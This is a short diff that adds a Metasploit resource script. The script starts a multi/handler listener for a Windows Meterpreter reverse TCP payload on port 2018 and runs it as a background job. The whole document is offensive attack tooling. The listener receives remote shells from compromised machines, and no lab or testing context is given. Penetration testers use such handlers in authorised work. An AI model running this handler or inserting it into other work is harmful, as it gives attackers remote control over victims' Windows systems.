@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+show options
+set LHOST 0.0.0.0
+set LPORT 2018
+exploit -j
